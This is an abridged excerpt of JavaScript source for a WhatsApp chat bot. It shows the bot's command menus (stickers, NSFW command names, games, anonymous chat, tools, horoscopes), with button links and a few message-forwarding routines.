╠ ${prefix}emoji
╠ ${prefix}emojimix
╠ ${prefix}attp
...
await xylaa.send5ButImg(from, `╔═══════✪「 ANIME STICKER 」	
╠${prefix}loli
╠${prefix}bully
╠${prefix}cuddle
╠${prefix}cry
...
await xylaa.send5ButImg(from, `╔═══════✪「 NSFW | ALL BROKEN 」	
╠${prefix}hentaivideo
╠${prefix}yuri
╠${prefix}masturbation
╠${prefix}thighs
...
await xylaa.send5ButImg(from, `╔═══════✪「 Fun 」	
╠ ${prefix}how [text
╠ ${prefix}when [text]
╠ ${prefix}where [text]
╠ ${prefix}is [text]
...
await xylaa.send5ButImg(from, `╔═══════✪「 Sound 」	
╠ ${prefix}sound1
╠ ${prefix}sound2
╠ ${prefix}sound3
╠ ${prefix}sound4
...
await xylaa.send5ButImg(from, `╔═══════✪「 GAME 」	
╠ ${prefix}truth
╠ ${prefix}dare
╠ ${prefix}tictactoe
╠ ${prefix}delttt
...
await xylaa.send5ButImg(from, `╔═══✪「 ANONYMOUS 」	
╠${prefix}anonymous
╠${prefix}start
╠${prefix}next
╠${prefix}leave
...
await xylaa.send5ButImg(from, `╔═══════✪「 TOOL 」	
╠ ${prefix}translate [text]
╠ ${prefix}fliptext [text]
╠ ${prefix}toletter [number]
╚═════════════✪` + '' + ' ', `${botname}`,unicorn, [{"urlButton": {"displayText": "YouTube 📍","url": `${websitex}`}},{"urlButton": {"displayText": "Script🔖","url": `${botscript}`}},{"quickReplyButton": {"displayText": "Donate 🍜","id": 'donate'}},{"quickReplyButton": {"displayText": "Owner 👤","id": 'owner'}}] )
...
await xylaa.send5ButImg(from, `╔═══✪「 DATABASE 」	
╠ ${prefix}setcmd
╠ ${prefix}listcmd
╠ ${prefix}delcmd
╠ ${prefix}lockcmd
...
await xylaa.send5ButImg(from, `╔═══════✪「 INDO 」	
╠ ${prefix}darkjoke
╠ ${prefix}quotes
╠ ${prefix}animequotes
╠${prefix}jalantikus-meme
...
await xylaa.send5ButImg(from, `╔═✪「 INDO HOROSCOPE 」	
╠${prefix}nomorhoki
╠${prefix}artimimpi 
╠${prefix}artinama 
╠${prefix}ramaljodoh 
...
await xylaa.send5ButImg(from, `╔═══════✪「 OTHER 」	
╠ ${prefix}afk
╠ ${prefix}readmore [text]
╠ ${prefix}toviewonce
╠ ${prefix}chatinfo
...
xylaa.sendReadReceipt(m.chat, m.sender, [m.key.id])
xylaa.sendMessage(from, {sticker:sendNye, contextInfo:{forwardingScore: 800, isForwarded: true}}, {quoted:m})
}
//anti-tag 3
...
xylaa.sendMessage(from, {sticker:sendNye, contextInfo:{forwardingScore: 800, isForwarded: true}}, {quoted:m})
		...
		if (isCmd && budy.toLowerCase() != undefined) {
		    ...
		    xylaa.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
